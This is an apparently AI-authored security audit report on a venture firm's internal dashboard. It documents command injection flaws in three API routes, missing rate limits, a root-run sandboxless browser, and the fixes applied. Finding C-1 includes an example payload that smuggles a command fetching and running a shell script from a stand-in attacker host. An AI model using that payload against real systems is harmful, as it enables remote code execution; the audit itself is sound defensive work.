# Security Audit Report — GroundUp Toolkit

**Date:** 2026-03-15
**Scope:** Full codebase — dashboard (27 API routes), Python scripts/skills, infrastructure
**Auditor:** Automated security audit (Claude)

---

## Executive Summary

The toolkit has **strong fundamentals** — all 27 API routes have auth checks, secrets are properly externalized, SQL queries are parameterized, and SSRF protection is well-implemented. However, **3 CRITICAL command injection vulnerabilities** exist where user-controlled parameters are interpolated directly into `execSync` shell strings. These are the highest priority to fix.

### Severity Distribution

| Severity | Count | Status |
|----------|-------|--------|
| CRITICAL | 3 | Open |
| HIGH | 3 | Open |
| MEDIUM | 2 | Open |
| LOW | 4 | Informational |
| INFO (positive) | 8 | N/A |

---

## CRITICAL Findings

### C-1: Command Injection in `/api/actions/route.ts`

- **Location:** `dashboard/app/api/actions/route.ts` lines 58-59, 75-76, 92-93
- **Description:** `dealId`, `stageId`, and `personId` from the request body are interpolated directly into `execSync` template strings with zero sanitization.
- **Impact:** Authenticated user can execute arbitrary commands as root. Example payload: `{"action":"move-deal-stage","dealId":"1; curl attacker.com/shell.sh|bash","stageId":"1"}`
- **CVSS:** 9.1 (Critical) — requires authentication, but any @groundup.vc user can exploit
- **Fix:** Replace `execSync` template strings with `execFileSync` using argument arrays.

### C-2: Command Injection in `/api/deal-timeline/route.ts`

- **Location:** `dashboard/app/api/deal-timeline/route.ts` lines 38-44
- **Description:** `company` parameter is "escaped" by replacing `"` with `\"` — this is trivially bypassed with `$(cmd)`, backticks, or `\`. `dealId` parameter is completely unescaped.
- **Impact:** Same as C-1 — arbitrary command execution.
- **Fix:** Replace with `execFileSync` using argument arrays.

### C-3: Command Injection in `/api/relationships/route.ts`

- **Location:** `dashboard/app/api/relationships/route.ts` lines 45-46, 69-70
- **Description:** `from`, `to`, and `person` parameters have only `"` characters removed (`replace(/"/g, "")`). All other shell metacharacters pass through: `$()`, backticks, `|`, `;`, `&&`, etc.
- **Impact:** Same as C-1 — arbitrary command execution.
- **Fix:** Replace with `execFileSync` using argument arrays. Add rate limiting.

---

## HIGH Findings

### H-1: Missing Rate Limiting on 3 Routes

- **Location:**
  - `dashboard/app/api/relationships/route.ts`
  - `dashboard/app/api/portfolio/tear-sheet/route.ts`
  - `dashboard/app/api/portfolio/add-context/route.ts`
- **Description:** These routes have no rate limiting. `add-context` and `tear-sheet` trigger expensive operations (AI calls, PDF processing). `relationships` triggers subprocess execution.
- **Impact:** DoS via resource exhaustion; amplifies command injection risk on `/relationships`.
- **Fix:** Add `rateLimit()` middleware to each.

### H-2: `next-auth` Beta with Caret Range

- **Location:** `dashboard/package.json` line 18
- **Description:** `"next-auth": "^5.0.0-beta.30"` — pre-release version with caret range allowing automatic updates to untested beta versions.
- **Impact:** Supply chain risk — untested beta updates auto-install on `npm install`.
- **Fix:** Pin to exact version: `"5.0.0-beta.30"`.

### H-3: LinkedIn Browser Runs as Root Without Sandbox

- **Location:** `services/linkedin-browser.service`
- **Description:** Chromium runs as `root` with `--no-sandbox` and `--remote-debugging-port=18801`.
- **Impact:** Browser compromise = full root access. CDP port accessible from network = full browser takeover.
- **Fix:** Create dedicated unprivileged user. Add `--remote-debugging-address=127.0.0.1`. Verify with firewall rules.
- **Note:** Server-side fix, not addressed in this code audit.

---

## MEDIUM Findings

### M-1: Error Messages May Leak Internal Details

- **Location:** `dashboard/app/api/actions/route.ts` line 64, `deal-timeline/route.ts` line 51
- **Description:** `err.message` from `execSync` failures returned to client. May contain server paths, command output, or internal errors.
- **Fix:** Return generic error messages to client; log details server-side only.

### M-2: PDF Path Injection in `/api/portfolio/add-context`

- **Location:** `dashboard/app/api/portfolio/add-context/route.ts` lines 35-42
- **Description:** While `tmpPdfPath` and `tmpTextPath` are generated from `Date.now()` (not user input), the Python code is embedded in a template string passed to `execSync`. If the temp path logic changes, this becomes exploitable.
- **Fix:** Use `execFileSync` with a standalone Python script instead of inline code.

---

## LOW / Informational

### L-1: JWT Sessions Cannot Be Revoked
- **Location:** `dashboard/lib/auth.ts` — JWT strategy with 7-day expiry.
- **Impact:** A stolen JWT remains valid until expiry. Acceptable for internal tool with domain-restricted Google OAuth.

### L-2: `X-Forwarded-For` IP Spoofing
- **Location:** `dashboard/lib/rate-limit.ts` line 141
- **Impact:** Rate limiting uses `x-forwarded-for` which can be spoofed without a reverse proxy. Currently no reverse proxy in use, so this is the correct behavior for direct connections.

### L-3: Data Directories Use Default Permissions
- **Location:** Various `os.makedirs()` calls in Python scripts.
- **Impact:** Low — server is single-user (root).

### L-4: `package-lock.json` in `.gitignore`
- **Location:** `.gitignore`
- **Impact:** Non-reproducible builds. Dashboard lock file should be tracked.

---

## Positive Findings (No Issues)

| Area | Status | Details |
|------|--------|---------|
| Secrets management | ✅ Secure | All secrets in env vars. `.env` gitignored. Clean git history. |
| SQL injection | ✅ Secure | All SQLite queries use `?` parameterized queries. |
| XSS | ✅ Secure | React auto-escaping. No `dangerouslySetInnerHTML`. |
| SSRF protection | ✅ Secure | `lib/safe_url.py` has domain allowlist + DNS pinning + redirect validation. |
| Auth coverage | ✅ Secure | All 27 API routes have authentication checks. |
| OAuth | ✅ Secure | Domain-restricted Google OAuth. PKCE + state validation via NextAuth. |
| Security headers | ✅ Secure | X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy configured. |
| GWS CLI | ✅ Secure | `lib/gws.py` uses list-based subprocess (no `shell=True`). |

---

## Audit Checklist

| Category | Status | Notes |
|----------|--------|-------|
| Authentication | ✅ | All routes protected. Google OAuth domain-restricted. |
| API Security | ⚠️ | 3 routes missing rate limiting. Command injection in 3 routes. |
| Data Security (SQL) | ✅ | Parameterized queries throughout. |
| Secrets | ✅ | Properly externalized. |
| Dependencies | ⚠️ | next-auth beta. |
| Infrastructure | ⚠️ | Browser as root (server-side, out of scope for code fix). |
| Input Validation | ❌ | Shell command injection via template strings. |
| SSRF | ✅ | Domain allowlist + DNS pinning. |
| XSS | ✅ | React auto-escaping. |
| CSRF | ✅ | SameSite cookies + JWT auth. |

---

## Remediation Plan

### Priority 1 — CRITICAL (fix immediately)
1. **C-1**: Replace `execSync` template strings in `/api/actions/route.ts` with `execFileSync` + argument arrays
2. **C-2**: Replace `execSync` template string in `/api/deal-timeline/route.ts` with `execFileSync` + argument arrays
3. **C-3**: Replace `execSync` template strings in `/api/relationships/route.ts` with `execFileSync` + argument arrays

### Priority 2 — HIGH (fix this session)
4. **H-1**: Add rate limiting to `/relationships`, `/portfolio/tear-sheet`, `/portfolio/add-context`
5. **H-2**: Pin `next-auth` to exact version

### Priority 3 — MEDIUM (fix soon)
6. **M-1**: Replace `err.message` with generic error responses
7. **M-2**: Extract inline Python to standalone script for PDF extraction

---

## Fixes Applied (2026-03-15)

| Finding | Fix | File |
|---------|-----|------|
| C-1 | Replaced `execSync` template strings with `execFileSync` + arg arrays. Added `/^\d+$/` validation for dealId, stageId, personId. Replaced `err.message` with generic errors. | `dashboard/app/api/actions/route.ts` |
| C-2 | Replaced `execSync` template string with `execFileSync("python3", [...args])`. Company/dealId now passed as separate arguments, not shell-interpolated. | `dashboard/app/api/deal-timeline/route.ts` |
| C-3 | Replaced `execSync` template strings with `execFileSync` + arg arrays. from/to/person now passed as arguments. Added rate limiting (20/min). | `dashboard/app/api/relationships/route.ts` |
| H-1 | Added `rateLimit()` to `/relationships` (20/min), `/portfolio/tear-sheet` (5/min), `/portfolio/add-context` (5/min). | 3 route files |
| M-1 | Replaced `err.message` responses with generic messages in actions route. | `dashboard/app/api/actions/route.ts` |
| M-2 | Changed inline Python template to `execFileSync` with `sys.argv` for PDF paths. | `dashboard/app/api/portfolio/add-context/route.ts` |

### Verification
- TypeScript: `npx tsc --noEmit` — clean (0 errors)
- Python tests: `pytest tests/ -v` — 171 passed
- No `execSync` calls remain in actions, deal-timeline, or relationships routes

---

## Recommendations

### Short-term
1. **Reverse proxy**: Add nginx/caddy in front of the dashboard with TLS termination and `Strict-Transport-Security` header. Currently the dashboard is exposed directly on port 3000.
2. **Content-Security-Policy**: Add a CSP header to `next.config.ts`. Start with `default-src 'self'` and adjust as needed.
3. **Migrate remaining `execSync` calls**: 10 other routes still use `execSync` with hardcoded commands. While not currently vulnerable (no user input), migrating to `execFileSync` prevents future regressions if someone adds parameters later.
4. **LinkedIn browser isolation**: Create a dedicated unprivileged user for the Chromium process. Add `--remote-debugging-address=127.0.0.1` and verify firewall blocks port 18801 externally.

### Medium-term
5. **Audit logging**: Log all authenticated API actions (who did what, when) to a tamper-resistant log. Currently there's no audit trail for actions like "move deal stage" or "create deal from signal."
6. **Input validation library**: Add a lightweight schema validator (e.g., Zod) for API route request bodies. Currently most routes do basic `if (!field)` checks but don't validate types or lengths.
7. **Dependency audit**: Run `npm audit` regularly. Pin `recharts` to exact version. Consider `npm audit signatures` for supply chain verification.

### Long-term
8. **Move away from shell execution**: The current architecture shells out to Python scripts via `execFileSync`. Consider using a proper API layer (FastAPI microservice, or direct database access from TypeScript) to eliminate the shell execution attack surface entirely.
9. **Session revocation**: If the team grows beyond a handful of trusted users, switch from JWT to database-backed sessions to enable immediate revocation.
10. **Secret rotation**: Document a secret rotation procedure for Google OAuth credentials, Anthropic API key, and HubSpot API key. Currently there's no rotation schedule.
